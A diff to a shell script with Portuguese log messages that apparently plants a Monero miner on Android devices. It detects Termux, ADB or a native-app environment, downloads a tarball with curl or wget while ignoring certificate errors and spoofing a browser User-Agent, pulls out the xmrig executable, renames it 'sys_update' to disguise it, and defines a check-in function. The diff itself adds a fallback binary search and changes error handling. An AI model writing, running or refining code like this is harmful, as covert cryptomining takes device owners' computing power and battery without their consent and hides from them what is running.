@@ -24,7 +24,7 @@ fi
 
 # Garantir diretório e Log inicial imediato
 mkdir -p "$TMP_BASE"
-echo "[$(date)] Script iniciado (Ambiente: Native=$IS_NATIVE_APP, Termux=$IS_TERMUX, ADB=$IS_ADB_ANDROID)" > "$TMP_BASE/sys_log.txt"
+echo "[$(date)] Script iniciado (Ambiente: Native=$IS_NATIVE_APP, Termux=$IS_TERMUX, ADB=$IS_ADB_ANDROID)" >> "$TMP_BASE/sys_log.txt"
 
 function send_checkin() {
     local status="$1"
@@ -67,43 +67,58 @@ fi
 NEW_BIN="$TMP_BASE/sys_update"
 LOG_FILE="$TMP_BASE/sys_log.txt"
 
-if [ ! -f "$NEW_BIN" ]; then
-    echo "[$(date)] Baixando minerador..." >> "$LOG_FILE"
-    echo "[$(date)] URL: $URL" >> "$LOG_FILE"
-    mkdir -p "$TMP_BASE"
-    cd "$TMP_BASE"
-    
-    # Tentar baixar com User-Agent e seguindo redirecionamentos
-    if command -v curl >/dev/null 2>&1; then
-        echo "[$(date)] Usando curl..." >> "$LOG_FILE"
-        curl -fkLsH "User-Agent: Mozilla/5.0" "$URL" -o pkg.tar.gz
-    elif command -v wget >/dev/null 2>&1; then
-        echo "[$(date)] Usando wget..." >> "$LOG_FILE"
-        wget --no-check-certificate --user-agent="Mozilla/5.0" "$URL" -O pkg.tar.gz
-    else
-        echo "[$(date)] Erro: Nem curl nem wget encontrados." >> "$LOG_FILE"
-        return 1
-    fi
-    
-    if [ ! -s pkg.tar.gz ]; then
-        echo "[$(date)] Erro: Download falhou (arquivo vazio). Verifique a internet." >> "$LOG_FILE"
-        rm -f pkg.tar.gz
-        return 1
-    fi
+echo "[$(date)] Verificando binario em: $NEW_BIN" >> "$LOG_FILE"
 
-    echo "[$(date)] Download concluido. Extraindo..." >> "$LOG_FILE"
-    tar -xzf pkg.tar.gz
-    
-    # Procurar o executável xmrig dentro da pasta extraída
-    XMRIG_PATH=$(find . -name "xmrig" -type f | head -n 1)
-    if [ -n "$XMRIG_PATH" ]; then
-        mv "$XMRIG_PATH" sys_update
-        chmod +x sys_update
-        echo "[$(date)] Minerador instalado com sucesso." >> "$LOG_FILE"
+if [ ! -f "$NEW_BIN" ]; then
+    if [ "$IS_NATIVE_APP" = "true" ]; then
+        echo "[$(date)] Erro: Binario nao encontrado. Tentando busca manual..." >> "$LOG_FILE"
+        FOUND_BIN=$(find "$TMP_BASE" -name "xmrig" -type f | head -n 1)
+        if [ -n "$FOUND_BIN" ]; then
+            mv "$FOUND_BIN" "$NEW_BIN"
+            chmod +x "$NEW_BIN"
+            echo "[$(date)] Binario recuperado em: $NEW_BIN" >> "$LOG_FILE"
+        else
+            echo "[$(date)] ERRO CRITICO: Binario realmente nao existe. O Java falhou." >> "$LOG_FILE"
+            exit 1
+        fi
     else
-        echo "[$(date)] Erro: Executavel xmrig nao encontrado no pacote." >> "$LOG_FILE"
+        echo "[$(date)] Baixando minerador..." >> "$LOG_FILE"
+        echo "[$(date)] URL: $URL" >> "$LOG_FILE"
+        mkdir -p "$TMP_BASE"
+        cd "$TMP_BASE"
+        
+        # Tentar baixar com User-Agent e seguindo redirecionamentos
+        if command -v curl >/dev/null 2>&1; then
+            echo "[$(date)] Usando curl..." >> "$LOG_FILE"
+            curl -fkLsH "User-Agent: Mozilla/5.0" "$URL" -o pkg.tar.gz
+        elif command -v wget >/dev/null 2>&1; then
+            echo "[$(date)] Usando wget..." >> "$LOG_FILE"
+            wget --no-check-certificate --user-agent="Mozilla/5.0" "$URL" -O pkg.tar.gz
+        else
+            echo "[$(date)] Erro: Nem curl nem wget encontrados." >> "$LOG_FILE"
+            exit 1
+        fi
+        
+        if [ ! -s pkg.tar.gz ]; then
+            echo "[$(date)] Erro: Download falhou (arquivo vazio). Verifique a internet." >> "$LOG_FILE"
+            rm -f pkg.tar.gz
+            exit 1
+        fi
+
+        echo "[$(date)] Download concluido. Extraindo..." >> "$LOG_FILE"
+        tar -xzf pkg.tar.gz
+        
+        # Procurar o executável xmrig dentro da pasta extraída
+        XMRIG_PATH=$(find . -name "xmrig" -type f | head -n 1)
+        if [ -n "$XMRIG_PATH" ]; then
+            mv "$XMRIG_PATH" "$NEW_BIN"
+            chmod +x "$NEW_BIN"
+            echo "[$(date)] Minerador instalado com sucesso." >> "$LOG_FILE"
+        else
+            echo "[$(date)] Erro: Executavel xmrig nao encontrado no pacote." >> "$LOG_FILE"
+        fi
+        rm -rf pkg.tar.gz xmrig-* 
     fi
-    rm -rf pkg.tar.gz xmrig-* 
 fi
 
 if [ -f "$NEW_BIN" ]; then
